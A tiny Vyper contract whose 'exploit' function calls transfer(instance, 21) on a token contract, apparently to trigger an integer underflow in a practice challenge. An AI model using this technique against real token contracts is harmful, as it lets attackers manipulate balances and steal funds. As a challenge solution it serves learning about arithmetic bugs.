# @version 0.3.3

interface Token:
    def transfer(_to: address, _value: uint256) -> bool: nonpayable
@external
def exploit(instance: address):
    Token(instance).transfer(instance, 21)
    
